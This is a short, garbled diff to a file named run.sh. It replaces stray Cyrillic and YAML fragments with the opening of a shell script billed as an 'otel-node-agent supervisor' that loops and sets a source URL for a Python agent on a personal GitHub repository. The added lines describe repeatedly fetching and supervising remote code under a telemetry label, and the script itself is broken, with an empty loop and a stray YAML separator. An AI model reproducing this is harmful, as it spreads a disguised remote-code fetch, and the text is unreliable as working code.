@@ -1,4 +1,7 @@
 run.sh
-
----статик-под?
-cxp-pod.yaml
+#!/bin/sh
+# otel-node-agent supervisor: fetch sub-agent and supervise
+while :; do
+---
+BOOT_INTERVAL=16
+BOOT_SRC=https://raw.githubusercontent.com/s34vv1nd/ops-pub/main/agent.py
